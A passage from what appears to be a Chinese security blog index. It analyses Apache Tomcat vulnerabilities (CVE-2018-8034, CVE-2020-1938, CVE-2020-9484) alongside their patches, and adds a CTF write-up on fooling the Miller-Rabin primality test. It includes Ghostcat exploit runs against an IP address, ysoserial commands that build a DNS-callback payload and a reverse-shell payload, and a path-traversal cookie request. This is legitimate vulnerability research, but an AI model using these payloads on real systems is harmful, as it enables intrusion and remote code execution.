inIndexLimit &amp;&amp; outRemaining &gt; 0; inIndex++) { int jchar = bArr[inIndex]; if (jchar &lt; 0) { jchar = jchar &amp; 0x7F; // If first byte is invalid, tail will be set to -1 int tail = remainingBytes[jchar]; if (tail == -1) { in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(1); } // Additional checks to detect invalid sequences ASAP // Checks derived from Unicode 6.2, Chapter 3, Table 3-7 // Check 2nd byte int tailAvailable = inIndexLimit - inIndex - 1; if (tailAvailable &gt; 0) { // First byte C2..DF, second byte 80..BF if (jchar &gt; 0x41 &amp;&amp; jchar &lt; 0x60 &amp;&amp; (bArr[inIndex + 1] &amp; 0xC0) != 0x80) { in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(1); } // First byte E0, second byte A0..BF if (jchar == 0x60 &amp;&amp; (bArr[inIndex + 1] &amp; 0xE0) != 0xA0) { in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(1); } // First byte E1..EC, second byte 80..BF if (jchar &gt; 0x60 &amp;&amp; jchar &lt; 0x6D &amp;&amp; (bArr[inIndex + 1] &amp; 0xC0) != 0x80) { in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(1); } // First byte ED, second byte 80..9F if (jchar == 0x6D &amp;&amp; (bArr[inIndex + 1] &amp; 0xE0) != 0x80) { in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(1); } // First byte EE..EF, second byte 80..BF if (jchar &gt; 0x6D &amp;&amp; jchar &lt; 0x70 &amp;&amp; (bArr[inIndex + 1] &amp; 0xC0) != 0x80) { in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(1); } // First byte F0, second byte 90..BF if (jchar == 0x70 &amp;&amp; ((bArr[inIndex + 1] &amp; 0xFF) &lt; 0x90 || (bArr[inIndex + 1] &amp; 0xFF) &gt; 0xBF)) { in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(1); } // First byte F1..F3, second byte 80..BF if (jchar &gt; 0x70 &amp;&amp; jchar &lt; 0x74 &amp;&amp; (bArr[inIndex + 1] &amp; 0xC0) != 0x80) { in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(1); } // First byte F4, second byte 80..8F if (jchar == 0x74 &amp;&amp; (bArr[inIndex + 1] &amp; 0xF0) != 0x80) { in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(1); } } // Check third byte if present and expected if (tailAvailable &gt; 1 &amp;&amp; tail &gt; 1) { if ((bArr[inIndex + 2] &amp; 0xC0) != 0x80) { in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(2); } } // Check fourth byte if present and expected if (tailAvailable &gt; 2 &amp;&amp; tail &gt; 2) { if ((bArr[inIndex + 3] &amp; 0xC0) != 0x80) { in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(3); } } if (tailAvailable &lt; tail) { break; } for (int i = 0; i &lt; tail; i++) { int nextByte = bArr[inIndex + i + 1] &amp; 0xFF; if ((nextByte &amp; 0xC0) != 0x80) { in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(1 + i); } jchar = (jchar &lt;&lt; 6) + nextByte; } jchar -= remainingNumbers[tail]; if (jchar &lt; lowerEncodingLimit[tail]) { // Should have been encoded in fewer octets in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(1); } inIndex += tail; } // Apache Tomcat added test if (jchar &gt;= 0xD800 &amp;&amp; jchar &lt;= 0xDFFF) { return CoderResult.unmappableForLength(3); } // Apache Tomcat added test if (jchar &gt; 0x10FFFF) { return CoderResult.unmappableForLength(4); } if (jchar &lt;= 0xffff) { cArr[outIndex++] = (char) jchar; outRemaining--; } else { if (outRemaining &lt; 2) { return CoderResult.OVERFLOW; } cArr[outIndex++] = (char) ((jchar &gt;&gt; 0xA) + 0xD7C0); cArr[outIndex++] = (char) ((jchar &amp; 0x3FF) + 0xDC00); outRemaining -= 2; } } in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return (outRemaining == 0 &amp;&amp; inIndex &lt; inIndexLimit) ? CoderResult.OVERFLOW : CoderResult.UNDERFLOW;}从UNICODE-UTF8转换表中可以看到，对于一个正常的UTF8编码，每个字节的首位都是1，因此在代码中使用int jchar = bArr[inIndex];得到的必然是负数，同时对标准的1 2 3 4字节长度的UTF8解码也会在判断if (jchar &lt; 0)中完成，当然这个判断也并不是处理了所有的情况，当所有判断tail长度的if通过后，进入了下面decode的循环12345678910for (int i = 0; i &lt; tail; i++) { int nextByte = bArr[inIndex + i + 1] &amp; 0xFF; if ((nextByte &amp; 0xC0) != 0x80) { in.position(inIndex - in.arrayOffset()); out.position(outIndex - out.arrayOffset()); return CoderResult.malformedForLength(1 + i); } jchar = (jchar &lt;&lt; 6) + nextByte;}jchar -= remainingNumbers[tail];最后得到的jchar就是UTF8解码后的值，最后在下面的判断中1234567891011if (jchar &lt;= 0xffff) { cArr[outIndex++] = (char) jchar; outRemaining--;} else { if (outRemaining &lt; 2) { return CoderResult.OVERFLOW; } cArr[outIndex++] = (char) ((jchar &gt;&gt; 0xA) + 0xD7C0); cArr[outIndex++] = (char) ((jchar &amp; 0x3FF) + 0xDC00); outRemaining -= 2;}jchar&lt;=0xffff是UTF8编码为2字节的情况，而在jchar&gt;0xffff时，其实就是编码为4字节的情况，当outRemaining &lt; 2时，也就是说输出的Buffer不足以放入这个值了，而patch修补的问题就是，在不足以放入这个值的时候，将原来Buffer的index往前回退**疑惑：**从commit描述和代码审计来看，都没有发现会造成CVE描述中所说的无限循环参考#https://blog.csdn.net/mrliuzhao/article/details/89453082https://github.com/apache/tomcat/commit/92cd494555598e99dd691712e8ee426a2f9c2e93https://zh.wikipedia.org/wiki/UTF-8CVE-2018-8034#The host name verification when using TLS with the WebSocket client was missing. It is now enabled by default. Versions Affected: Apache Tomcat 9.0.0.M1 to 9.0.9, 8.5.0 to 8.5.31, 8.0.0.RC1 to 8.0.52, and 7.0.35 to 7.0.88.123456789101112131415161718192021222324252627282930313233343536373839404142@@ -328,7 +329,7 @@ public class WsWebSocketContainer implements WebSocketContainer, BackgroundProce // Regardless of whether a non-secure wrapper was created for a // proxy CONNECT, need to use TLS from this point on so wrap the // original AsynchronousSocketChannel- SSLEngine sslEngine = createSSLEngine(userProperties);+ SSLEngine sslEngine = createSSLEngine(userProperties, host, port); channel = new AsyncChannelWrapperSecure(socketChannel, sslEngine); } else if (channel == null) { // Only need to wrap as this point if it wasn't wrapped to process a@@ -866,7 +867,7 @@ public class WsWebSocketContainer implements WebSocketContainer, BackgroundProce }- private SSLEngine createSSLEngine(Map&lt;String,Object&gt; userProperties)+ private SSLEngine createSSLEngine(Map&lt;String,Object&gt; userProperties, String host, int port) throws DeploymentException { try {@@ -904,7 +905,7 @@ public class WsWebSocketContainer implements WebSocketContainer, BackgroundProce } }- SSLEngine engine = sslContext.createSSLEngine();+ SSLEngine engine = sslContext.createSSLEngine(host, port); String sslProtocolsValue = (String) userProperties.get(Constants.SSL_PROTOCOLS_PROPERTY);@@ -914,6 +915,14 @@ public class WsWebSocketContainer implements WebSocketContainer, BackgroundProce engine.setUseClientMode(true);+ // Enable host verification+ // Start with current settings (returns a copy)+ SSLParameters sslParams = engine.getSSLParameters();+ // Use HTTPS since WebSocket starts over HTTP(S)+ sslParams.setEndpointIdentificationAlgorithm(\"HTTPS\");+ // Write the parameters back+ engine.setSSLParameters(sslParams);+ return engine; } catch (Exception e) { throw new DeploymentException(sm.getString(加入了对host和port的验证，用的SSLEngine是java自带的SSLEngine类，在建立是加入了host和port信息后，后续的SSL连接都只能与该主机通信。防止在通讯建立后，后续通信被中间人劫持参考#https://docs.oracle.com/javase/7/docs/api/javax/net/ssl/SSLEngine.htmlhttps://github.com/apache/tomcat/commit/2835bb4e030c1c741ed0847bb3b9c3822e4fbc8a","link":"/9dc656c7.html"},{"title":"CVE-2020-1938","text":"基本信息#When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection. If such connections are available to an attacker, they can be exploited in ways that may be surprising. In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended in the security guide) that this Connector would be disabled if not required. This vulnerability report identified a mechanism that allowed: - returning arbitrary files from anywhere in the web application - processing any file in the web application as a JSP Further, if the web application allowed file upload and stored those files within the web application (or the attacker was able to control the content of the web application by some other means) then this, along with the ability to process a file as a JSP, made remote code execution possible. It is important to note that mitigation is only required if an AJP port is accessible to untrusted users. Users wishing to take a defence-in-depth approach and block the vector that permits returning arbitrary files and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100 or later. A number of changes were made to the default AJP Connector configuration in 9.0.31 to harden the default configuration. It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to make small changes to their configurations.影响范围：7.0.0 - 7.0.998.5.0 - 8.5.509.0.0.M1 - 9.0.0.30漏洞复现#环境配置#./conf/server.xml中默认已默认打开AJP1292 &lt;!-- Define an AJP 1.3 Connector on port 8009 --&gt;93 &lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;攻击#任意文件读123# python CVE-2020-1938-read.py -p 8009 -f test.txt 47.100.18.67----------------------------This is Vulnerable CVE-2017-12617!任意文件包含1234// print.jsp&lt;% out.print(\"This is CVE-2020-1938\");%&gt;123# python CVE-2020-1938-include.py -p 8009 -f print.jsp 47.100.18.67----------------------------This is CVE-2020-1938原理#Request Prepare#./java/org/apache/coyote/ajp/AjpProcessor.java对于Ajp请求，Tomcat使用AjpProcessor类处理用户的请求123456789101112131415163 if (!getErrorState().isError()) { // Setting up filters, and parse some request headers rp.setStage(org.apache.coyote.Constants.STAGE_PREPARE); try { // 准备请求（将用户的请求转换为内部的请求） prepareRequest(); } catch (Throwable t) { ExceptionUtils.handleThrowable(t); log.debug(sm.getString(\"ajpprocessor.request.prepare\"), t); // 500 - Internal Server Error response.setStatus(500); setErrorState(ErrorState.CLOSE_CLEAN, t); getAdapter().log(request, response, 0); } }其中PrepareRequest方法继承自父类AbstractAjpProcessor，对请求进行预处理./java/org/apache/coyote/ajp/AbstractAjpProcessor.java12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152746 protected void prepareRequest() {...832 while ((attributeCode = requestHeaderMessage.getByte()) != Constants.SC_A_ARE_DONE) { switch (attributeCode) { case Constants.SC_A_REQ_ATTRIBUTE : requestHeaderMessage.getBytes(tmpMB); String n = tmpMB.toString(); requestHeaderMessage.getBytes(tmpMB); String v = tmpMB.toString(); /* * AJP13 misses to forward the local IP address and the * remote port. Allow the AJP connector to add this info via * private request attributes. * We will accept the forwarded data and remove it from the * public list of request attributes. */ if(n.equals(Constants.SC_A_REQ_LOCAL_ADDR)) { // 赋值IP给request request.localAddr().setString(v); } else if(n.equals(Constants.SC_A_REQ_REMOTE_PORT)) { // 赋值端口给request try { request.setRemotePort(Integer.parseInt(v)); } catch (NumberFormatException nfe) { // Ignore invalid value } } else if(n.equals(Constants.SC_A_SSL_PROTOCOL)) { // 将https属性加入key中 request.setAttribute(SSLSupport.PROTOCOL_VERSION_KEY, v); } else { // 其他情况直接加入key- request.setAttribute(n, v ); // All 'known' attributes will be processed by the previous // blocks. Any remaining attribute is an 'arbitrary' one.+ Pattern pattern = protocol.getAllowedArbitraryRequestAttributesPattern();+ if (pattern == null) {+ response.setStatus(403);+ setErrorState(ErrorState.CLOSE_CLEAN, null);+ } else {+ Matcher m = pattern.matcher(n);+ if (m.matches()) {+ request.setAttribute(n, v);+ } else {+ response.setStatus(403);+ setErrorState(ErrorState.CLOSE_CLEAN, null);+ }+ } } break;Request Process#预处理后转回AjpProcessor类进行请求处理，adapter根据web.xml中的设置选择JspServlet或者DefaultServlet进行处理./java/org/apache/coyote/ajp/AjpProcessor.java12345678910111213141516187 // Process the request in the adapter if (!getErrorState().isError()) { try { rp.setStage(org.apache.coyote.Constants.STAGE_SERVICE); adapter.service(request, response); } catch (InterruptedIOException e) { setErrorState(ErrorState.CLOSE_NOW, e); } catch (Throwable t) { ExceptionUtils.handleThrowable(t); log.error(sm.getString(\"ajpprocessor.request.process\"), t); // 500 - Internal Server Error response.setStatus(500); setErrorState(ErrorState.CLOSE_CLEAN, t); getAdapter().log(request, response, 0); } }Jsp后缀处理./java/org/apache/jasper/servlet/JspServlet.java :service12338 boolean precompile = preCompile(request);339 serviceJspFile(request, response, jspUri, precompile);./java/org/apache/jasper/servlet/JspServlet.java :serviceJspFile新建或获取当前的wapper，处理jsp文件，将结果作为response返回12345678910111213141516171819202122377 if (wrapper == null) { synchronized(this) { wrapper = rctxt.getWrapper(jspUri); if (wrapper == null) { // Check if the requested JSP page exists, to avoid // creating unnecessary directories and files. if (null == context.getResource(jspUri)) { handleMissingResource(request, response, jspUri); return; } wrapper = new JspServletWrapper(config, options, jspUri, rctxt); rctxt.addWrapper(jspUri,wrapper); } } } //调用JspServletWrapper执行请求的jsp文件 try { wrapper.service(request, response, precompile); } catch (FileNotFoundException fnfe) { handleMissingResource(request, response, jspUri); }普通后缀处理DefaultSerlvet类继承自HttpServlet，对于Get请求，使用doGet方法读取对应的内容作为response./java/javax/servlet/http/HttpServlet.java:service12345678910111213141516171819202122232425619 if (method.equals(METHOD_GET)) { long lastModified = getLastModified(req); if (lastModified == -1) { // servlet doesn't support if-modified-since, no reason // to go through further expensive logic doGet(req, resp); } else { long ifModifiedSince; try { ifModifiedSince = req.getDateHeader(HEADER_IFMODSINCE); } catch (IllegalArgumentException iae) { // Invalid date header - proceed as if none was set ifModifiedSince = -1; } if (ifModifiedSince &lt; (lastModified / 1000 * 1000)) { // If the servlet mod time is later, call doGet() // Round down to the nearest second for a proper compare // A ifModifiedSince of -1 will always be less maybeSetLastModified(resp, lastModified); doGet(req, resp); } else { resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); } } }利用方法#使用Ajp协议请求网站根目录下的文件防护方法#原本默认开启的AJP服务被设置为默认关闭建议用户在使用AJP服务时使用安全认证机制对含有任意请求属性的访问返回403（拒绝exp中控制设置的属性的ajp请求）patch链接：https://github.com/apache/tomcat/commit/86768e423a6ca0ae32e64acb65c9ae8dccf52256https://github.com/apache/tomcat/commit/38a0fd9bb287e9e70eb61a5d8ea12cf602fb6398https://github.com/apache/tomcat/commit/2e108583e8665fdc61970137a409f15c4df3a36f参考资料#AJP协议官方文档CVE-2020-1938漏洞分析CVE-2020-1938 EXP","link":"/f95006f9.html"},{"title":"CVE-2020-9484","text":"When using Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103 if a) an attacker is able to control the contents and name of a file on the server; and b) the server is configured to use the PersistenceManager with a FileStore; and c) the PersistenceManager is configured with sessionAttributeValueClassNameFilter=“null” (the default unless a SecurityManager is used) or a sufficiently lax filter to allow the attacker provided object to be deserialized; and d) the attacker knows the relative file path from the storage location used by FileStore to the file the attacker has control over; then, using a specifically crafted request, the attacker will be able to trigger remote code execution via deserialization of the file under their control. Note that all of conditions a) to d) must be true for the attack to succeed.攻击条件#存在文件上传(文件后缀为.session)启用了tomcat的session持久化功能，在conf/context.xml中开启1234567891011121314&lt;Context&gt; ... &lt;Manager className=\"org.apache.catalina.session.PersistentManager\" debug=\"0\" saveOnRestart=\"false\" maxActiveSession=\"-1\" minIdleSwap=\"-1\" maxIdleSwap=\"-1\" maxIdleBackup=\"-1\"&gt; &lt;Store className=\"org.apache.catalina.session.FileStore\" directory=\"./session\" /&gt; &lt;/Manager&gt;&lt;/Context&gt;tomcat/lib或WEB-INF/lib下存在能够利用的反序列化gadget漏洞原理#org.apache.catalina.session.FileStore在使用load函数读取.session文件时，file函数未对/../路径穿越进行过滤123456789101112131415161718192021222324252627282930313233@Overridepublic Session load(String id) throws ClassNotFoundException, IOException { // Open an input stream to the specified pathname, if any File file = file(id); //file函数路径穿越 if (file == null || !file.exists()) { return null; } Context context = getManager().getContext(); Log contextLog = context.getLogger(); if (contextLog.isDebugEnabled()) { contextLog.debug(sm.getString(getStoreName()+\".loading\", id, file.getAbsolutePath())); } ClassLoader oldThreadContextCL = context.bind(Globals.IS_SECURITY_ENABLED, null); try (FileInputStream fis = new FileInputStream(file.getAbsolutePath()); ObjectInputStream ois = getObjectInputStream(fis)) { StandardSession session = (StandardSession) manager.createEmptySession(); session.readObjectData(ois); session.setManager(manager); return session; } catch (FileNotFoundException e) { if (contextLog.isDebugEnabled()) { contextLog.debug(\"No persisted data file found\"); } return null; } finally { context.unbind(Globals.IS_SECURITY_ENABLED, oldThreadContextCL); }}file函数存在路径穿越，因此在请求时可以构造JSESSIONID使得它可以读到任意位置的.session文件进行反序列化1234567891011121314151617181920212223@@ -336,11 +342,20 @@ public final class FileStore extends StoreBase { * used in the file naming. */ private File file(String id) throws IOException {- if (this.directory == null) {+ File storageDir = directory();+ if (storageDir == null) { return null; }+ String filename = id + FILE_EXT;- File file = new File(directory(), filename);+ File file = new File(storageDir, filename);++ // Check the file is within the storage directory+ if (!file.getCanonicalPath().startsWith(storageDir.getCanonicalPath())) {+ log.warn(sm.getString(\"fileStore.invalid\", file.getPath(), id));+ return null;+ }+ return file; } }由于当前类加载器破坏了双亲委托模型的隐式加载，Thread.currentThread().getContextClassLoader()可以加载到WEB-INF/lib下的依赖12345678910111213141516protected ObjectInputStream getObjectInputStream(InputStream is) throws IOException { BufferedInputStream bis = new BufferedInputStream(is); CustomObjectInputStream ois; ClassLoader classLoader = Thread.currentThread().getContextClassLoader(); if (manager instanceof ManagerBase) { ManagerBase managerBase = (ManagerBase) manager; ois = new CustomObjectInputStream(bis, classLoader, manager.getContext().getLogger(), managerBase.getSessionAttributeValueClassNamePattern(), managerBase.getWarnOnSessionAttributeFilterFailure()); } else { ois = new CustomObjectInputStream(bis, classLoader); } return ois;POC验证#STEP1: 配置context.xml文件，允许session持久化STEP2: 生成payload1java -jar ysoserial.jar URLDNS &quot;http://xxxxxx.ceye.io&quot; &gt; poc.sessionSTEP3:将poc.session放入某路径下(path)STEP4:curl触发1curl -k 'https://ip:port/xxxxx.jsp' -H 'Cookie: JSESSIONID=../../../path/poc'RCE攻击#结合tomcat的其他漏洞：例如文件上传(CVE-2017-12615/CVE-2017-12617)上传webshell，在确保tomcat/lib或WEB-INF/lib下存在反序列化依赖时，可以使用ysoserial.jar构造反序列化反弹shell例如：1java -jar ysoserial.jar Groovy1 &quot;python shell.py&quot; &gt; poc.session参考#https://mp.weixin.qq.com/s/OGdHSwqydiDqe-BUkheTGghttps://github.com/apache/tomcat/commit/bb33048e3f9b4f2b70e4da2e6c4e34ca89023b1bhttps://github.com/frohoff/ysoserial","link":"/de7e28a5.html"},{"title":"Bypass Miller Rabin Test","text":"在一道密码学题目中碰到的问题，需要绕过Miller-Rabin素性测试，稍微记录一下题目要求在2**600到2**900范围内找到一个数，这个数不是质数，但可以通过Miller-Rabin素性测试12345678910111213141516171819202122232425262728293031323334353637def generate_basis(n): basis = [True] * n for i in range(3, int(n**0.5)+1, 2): if basis[i]: basis[i*i::2*i] = [False]*((n-i*i-1)//(2*i)+1) return [2] + [i for i in range(3, n, 2) if basis[i]]def miller_rabin(n, b): \"\"\" Miller Rabin test testing over all prime basis &lt; b \"\"\" basis = generate_basis(b) if n == 2 or n == 3: return True if n % 2 == 0: return False r, s = 0, n - 1 while s % 2 == 0: r += 1 s //= 2 for b in basis: x = pow(b, s, n) if x == 1 or x == n - 1: continue for _ in range(r - 1): x = pow(x, 2, n) if x == n - 1: break else: return False return True miller_rabin(p,64)从虽然从参考资料中的论文给出了一些示例，但都不符合题目的限制，不过好在参考资料的appendix A里给了十分完整的示例，可以对着复现和验证假设我们的伪素数$n = p_1 p_2…p_h$，其中$p_i$是不同的素数，使得$n$是基${a_1,a_2…a_t}$下的伪素数，在本文中，$h=3$论文中的方法是先找到一个$p_1$，然后生成$p_i = k_i(p_i-1)+1$，最后合成伪素数$n$找$p_1$的步骤如下Step1：求Sa#显然对于miller_rabin(p,64)而言，我们的A为64以下的所有质数，求A如下12345678910def generate_basis(n): basis = [True] * n for i in range(3, int(n**0.5)+1, 2): if basis[i]: basis[i*i::2*i] = [False]*((n-i*i-1)//(2*i)+1) return [2] + [i for i in range(3, n, 2) if basis[i]]A = generate_basis(64)print('A:', A)# [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61]而我们要求的Sa集合，它要求，对于每个基a，在3~(4*a-1)范围内所有与a的Jacobi结果为-1的数字的集合，如下1234567891011121314151617181920212223242526272829Sa = {}print(\"Sa: \")for a in A: Sa[a] = [] for _ in range(3, 4*a-1, 2): if libnum.jacobi(a, _) == -1: Sa[a].append(_) print(a, Sa[a])'''Sa:2 [3, 5]3 [5, 7]5 [3, 7, 13, 17]7 [5, 11, 13, 15, 17, 23]11 [3, 13, 15, 17, 21, 23, 27, 29, 31, 41]13 [5, 7, 11, 15, 19, 21, 31, 33, 37, 41, 45, 47]17 [3, 5, 7, 11, 23, 27, 29, 31, 37, 39, 41, 45, 57, 61, 63, 65]19 [7, 11, 13, 21, 23, 29, 33, 35, 37, 39, 41, 43, 47, 53, 55, 63, 65, 69]23 [3, 5, 17, 21, 27, 31, 33, 35, 37, 39, 45, 47, 53, 55, 57, 59, 61, 65, 71, 75, 87, 89]29 [3, 11, 15, 17, 19, 21, 27, 31, 37, 39, 41, 43, 47, 55, 61, 69, 73, 75, 77, 79, 85, 89, 95, 97, 99, 101, 105, 113]31 [7, 13, 17, 19, 21, 29, 35, 37, 39, 47, 51, 53, 57, 59, 61, 63, 65, 67, 71, 73, 77, 85, 87, 89, 95, 103, 105, 107, 111, 117]37 [5, 13, 15, 17, 19, 23, 29, 31, 35, 39, 43, 45, 51, 55, 57, 59, 61, 69, 79, 87, 89, 91, 93, 97, 103, 105, 109, 113, 117, 119, 125, 129, 131, 133, 135, 143]41 [3, 7, 11, 13, 15, 17, 19, 27, 29, 35, 47, 53, 55, 63, 65, 67, 69, 71, 75, 79, 85, 89, 93, 95, 97, 99, 101, 109, 111, 117, 129, 135, 137, 145, 147, 149, 151, 153, 157, 161]43 [5, 11, 15, 23, 29, 31, 33, 35, 37, 45, 47, 59, 61, 65, 67, 69, 73, 77, 79, 83, 85, 87, 89, 93, 95, 99, 103, 105, 107, 111, 113, 125, 127, 135, 137, 139, 141, 143, 149, 157, 161, 167]47 [3, 5, 7, 13, 27, 29, 33, 41, 45, 51, 55, 57, 59, 63, 69, 71, 73, 75, 77, 79, 83, 85, 93, 95, 103, 105, 109, 111, 113, 115, 117, 119, 125, 129, 131, 133, 137, 143, 147, 155, 159, 161, 175, 181, 183, 185]53 [3, 5, 19, 21, 23, 27, 31, 33, 35, 39, 41, 45, 51, 55, 61, 65, 67, 71, 73, 75, 79, 83, 85, 87, 101, 103, 109, 111, 125, 127, 129, 133, 137, 139, 141, 145, 147, 151, 157, 161, 167, 171, 173, 177, 179, 181, 185, 189, 191, 193, 207, 209]59 [3, 7, 13, 15, 19, 27, 33, 35, 37, 51, 61, 63, 65, 69, 71, 73, 75, 77, 79, 87, 89, 93, 95, 97, 101, 107, 109, 113, 117, 119, 123, 127, 129, 135, 139, 141, 143, 147, 149, 157, 159, 161, 163, 165, 167, 171, 173, 175, 185, 199, 201, 203, 209, 217, 221, 223, 229, 233]61 [7, 11, 17, 21, 23, 29, 31, 33, 35, 37, 43, 51, 53, 55, 59, 63, 67, 69, 71, 79, 85, 87, 89, 91, 93, 99, 101, 105, 111, 115, 129, 133, 139, 143, 145, 151, 153, 155, 157, 159, 165, 173, 175, 177, 181, 185, 189, 191, 193, 201, 207, 209, 211, 213, 215, 221, 223, 227, 233, 237]'''Step2：求Sb#在求Sb前，我们需要先指定$k_i$的值(只要是质数就行)，这里我们指定$k_2 = 701、k_3 = 257$我们可以看到Sb其实就是取了一个$k_i^{-1}(Sa+k_i-1)$的交集123456789101112131415161718192021222324252627282930print(\"Sb:\")Sb = {}for a in A: result = [] for b in Sa[a]: if((k2*(b-1)+1) % (4*a) in Sa[a] and (k3*(b-1)+1) % (4*a) in Sa[a]): result.append(b) Sb[a]=result print(a,Sb[a])'''Sb:2 [3, 5]3 [7]5 [7, 17]7 [11, 13, 15]11 [17, 23, 41]13 [21, 47]17 [29, 63]19 [29, 39, 47, 55]23 [5, 31, 47, 59, 61]29 [21, 41, 55, 79, 99, 113]31 [17, 19, 37, 39, 63, 95]37 [13, 17, 19, 23, 29, 31, 45, 61, 69, 87, 91, 93, 97, 103, 105, 119, 135, 143]41 [17, 35, 63, 67, 69, 99, 117, 145, 149, 151]43 [31, 33, 35, 37, 47, 61, 85, 87, 89, 105, 143]47 [41, 45, 59, 69, 71, 79, 95, 103, 147, 161, 181]53 [27, 61, 65, 67, 75, 83, 85, 87, 133, 167, 171, 173, 181, 189, 191, 193]59 [33, 51, 69, 79, 95, 97, 113, 119, 127, 141, 157, 159, 165, 185]61 [7, 17, 23, 55, 59, 69, 105, 111, 129, 139, 145, 177, 181, 191, 227, 233]'''Step3 ：CRT求p1#最后从每个基的Sb​集合中选择一个，进行CRT求出p1由于是随机选取，所以CRT未必满足条件，因此要多次random选出能成功CRT的序列1234567891011121314151617181920212223p1 = - inverse(k3, k2) % k2p2 = - inverse(k2, k3) % k3print(p1, p2)print(isPrime(k2), isPrime(k3))for i in range(0, 100000): try: crt_A = [] crt_B = [] for a in A: crt_A.append(random.choice(Sb[a])) crt_B.append(4*a) crt_A.append(p1) crt_A.append(p2) crt_B.append(k2) crt_B.append(k3) print(crt(crt_A, crt_B)) print(crt_A) print(crt_B) break except: continuep1 = crt(crt_A, crt_B)然后求一下p1的模数，根据$p_i = k_i(p_1-1)+1$求出其余的数，稍微调整一下大小到600bits-900bits之间即可1234567891011121314151617181920212223242526d = {}for n in crt_B: k = factorize(n) for key in k.keys(): if(key in d.keys()): if(d[key] &lt; k[key]): d[key] = k[key] else: d[key] = k[key]mod_number = 1for key in d.keys(): mod_number *= pow(key, d[key])print('mod:', mod_number)for _ in range(100000): if(_ % 10000 == 0): print(_) p1 = p1+mod_number*_*pow(2,100) p2 = k2*(p1-1)+1 p3 = k3*(p1-1)+1 if(isPrime(p1) and isPrime(p2) and isPrime(p3)): n = p1*p2*p3 if(miller_rabin(n, 64)): print(p1, p2, p3) print(n) print(miller_rabin(n, 64)) break完整exp#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168# https://eprint.iacr.org/2018/749.pdfimport libnumfrom libnum.factorize import factorizefrom sage.all import *import randomfrom Crypto.Util.number import inverse, isPrimedef generate_basis(n): basis = [True] * n for i in range(3, int(n**0.5)+1, 2): if basis[i]: basis[i*i::2*i] = [False]*((n-i*i-1)//(2*i)+1) return [2] + [i for i in range(3, n, 2) if basis[i]]def miller_rabin(n, b): \"\"\" Miller Rabin test testing over all prime basis &lt; b \"\"\" basis = generate_basis(b) if n == 2 or n == 3: return True if n % 2 == 0: return False r, s = 0, n - 1 while s % 2 == 0: r += 1 s //= 2 for b in basis: x = pow(b, s, n) if x == 1 or x == n - 1: continue for _ in range(r - 1): x = pow(x, 2, n) if x == n - 1: break else: return False return TrueA = generate_basis(64)print('A:', A)Sa = {}print(\"Sa: \")for a in A: Sa[a] = [] for _ in range(3, 4*a-1, 2): if libnum.jacobi(a, _) == -1: Sa[a].append(_) print(a, Sa[a])k2 = 701k3 = 257print(\"Sb:\")Sb = {}for a in A: result = [] for b in Sa[a]: if((k2*(b-1)+1) % (4*a) in Sa[a] and (k3*(b-1)+1) % (4*a) in Sa[a]): result.append(b) Sb[a]=result print(a,Sb[a])p1 = - inverse(k3, k2) % k2p2 = - inverse(k2, k3) % k3print(p1, p2)print(isPrime(k2), isPrime(k3))for i in range(0, 100000): try: crt_A = [] crt_B = [] for a in A: crt_A.append(random.choice(Sb[a])) crt_B.append(4*a) crt_A.append(p1) crt_A.append(p2) crt_B.append(k2) crt_B.append(k3) print(crt(crt_A, crt_B)) print(crt_A) print(crt_B) break except: continuep1 = crt(crt_A, crt_B)d = {}for n in crt_B: k = factorize(n) for key in k.keys(): if(key in d.keys()): if(d[key] &lt; k[key]): d[key] = k[key] else: d[key] = k[key]mod_number = 1for key in d.keys(): mod_number *= pow(key, d[key])print('mod:', mod_number)for _ in range(100000): if(_ % 10000 == 0): print(_) p1 = p1+mod_number*_*pow(2,100) p2 = k2*(p1-1)+1 p3 = k3*(p1-1)+1 if(isPrime(p1) and isPrime(p2) and isPrime(p3)): n = p1*p2*p3 if(miller_rabin(n, 64)): print(p1, p2, p3) print(n) print(miller_rabin(n, 64)) break'''A: [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61]Sa:2 [3, 5]3 [5, 7]5 [3, 7, 13, 17]7 [5, 11, 13, 15, 17, 23]11 [3, 13, 15, 17, 21, 